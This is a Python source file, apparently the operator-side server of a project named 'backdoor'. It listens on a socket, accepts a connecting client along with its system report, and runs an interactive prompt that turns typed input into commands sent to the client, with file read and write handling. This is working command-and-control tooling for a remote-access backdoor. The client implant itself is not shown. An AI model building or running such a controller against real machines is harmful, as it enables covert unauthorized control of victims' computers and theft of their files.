# pyright: reportUnusedVariable=false
from argparse import ArgumentParser, Namespace
import socket

from backdoor.command.converter import InputToCommandConverter
from backdoor.command.processor import CommandProcessor
from backdoor.exceptions.core import PresentableApplicationException
from backdoor.files.io import FileReader, FileWriter
from backdoor.messages.exchange.server import ServerExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.messages.protocol import SocketProtocol
from backdoor.models.client import ClientModel
from backdoor.models.commands import Command
from backdoor.serialization.jsonserializer import JsonSerializer
from backdoor.utils.errors import print_error


class Server:

    def __init__(
        self,
        messenger: SocketMessenger,
        exchanger: ServerExchangeMapper,
        converter: InputToCommandConverter,
        processor: CommandProcessor,
        host: str = "localhost",
        port: int = 4567,
    ) -> None:
        self.host = host
        self.port = port
        self.messenger = messenger
        self.exchanger = exchanger
        self.converter = converter
        self.processor = processor
        self.socket = self.__create_socket(host, port)
        self.ps1 = ">>> "

    def start(self) -> None:
        client = self.__accept_connection()
        self.__read_client_report(client)

        while (inp := self.__get_input()) != "exit":
            command = self.converter.convert(inp)
            self.__perform_command(client, command)

    def __perform_command(self, client: ClientModel, command: Command) -> None:
        try:
            self.processor.pre_process(command)
            result = self.exchanger.exchange(client, command)
            self.processor.post_process(command, result)
        except PresentableApplicationException as e:
            print_error(e)

    def __accept_connection(self) -> ClientModel:
        sock, addr = self.socket.accept()
        host, port = addr
        return ClientModel(**locals())

    def __read_client_report(self, client: ClientModel) -> None:
        report = self.messenger.receive(client.sock)
        client.report = report

    def __get_input(self) -> str:
        while not (inp := input(self.ps1).strip()):
            ...
        return inp

    def __create_socket(self, host: str, port: int) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(0)
        return sock


def parse_args() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument('-a', '--host', required=False, default='127.0.0.1')
    parser.add_argument('-p', '--port', required=False, default=4567, type=int)
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    protocol = SocketProtocol()
    serializer = JsonSerializer()
    converter = InputToCommandConverter()
    file_writer = FileWriter()
    file_reader = FileReader()

    messenger = SocketMessenger(protocol, serializer)
    exchanger = ServerExchangeMapper(messenger)
    processor = CommandProcessor(file_writer, file_reader)

    server = Server(messenger, exchanger, converter, processor, host=args.host, port=args.port)

    try:
        print(f'Server running at {args.host}:{args.port}.')
        server.start()
    except KeyboardInterrupt:
        ...   


if __name__ == "__main__":
    main()
